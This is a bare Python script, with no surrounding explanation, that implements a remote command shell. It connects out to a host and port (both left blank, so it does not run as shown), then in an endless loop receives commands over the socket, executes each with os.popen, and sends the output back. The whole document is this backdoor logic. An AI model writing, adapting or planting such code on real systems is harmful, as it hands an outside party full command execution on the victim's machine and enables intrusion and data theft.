import socket,os

host = ""
port =

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

sock.connect((host, port))

while True:
    command = sock.recv(1024)
    for line in os.popen(command):
        sock.send(line)
